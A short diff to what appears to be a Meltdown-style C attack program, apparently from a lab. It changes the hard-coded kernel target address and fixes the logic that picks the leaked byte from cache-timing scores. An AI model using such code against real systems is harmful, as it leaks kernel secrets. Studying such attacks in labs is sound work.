@@ -54,7 +54,7 @@ void probe() {
 
 int main(int argc, char* argv[]) {
 
-	unsigned long kernel_addr = 0xffffffffc01ed000; // address of secret value in kernel space
+	unsigned long kernel_addr = 0xffffffffc0190000; // address of secret value in kernel space
 
 	// register signal handler for seg fault
 	signal(SIGSEGV, catch_segv);
@@ -111,10 +111,14 @@ int main(int argc, char* argv[]) {
 			probe(); 
 		} // iter ; end
 		int max = 0;
+		unsigned char guess = 0;
 		for(i=0; i<PROBE_N; i++) {
-			if(scores[i] > max) max = i;
+			if(scores[i] > max) {
+				guess = i;
+				max = scores[i];
+			}
 		}
-		printf("%-12i %-12c %-12i %-12i %-12i\n", c, max, max, scores[max], ITER_N);
+		printf("%-12i %-12c %-12x %-12i %-12i\n", c, guess, guess, scores[guess], ITER_N);
 
 		//printf("Guess: %c (%i) ; %i hits out of %i iterations)\n", max, max, scores[max], ITER_N);
 		kernel_addr++; // move to next char
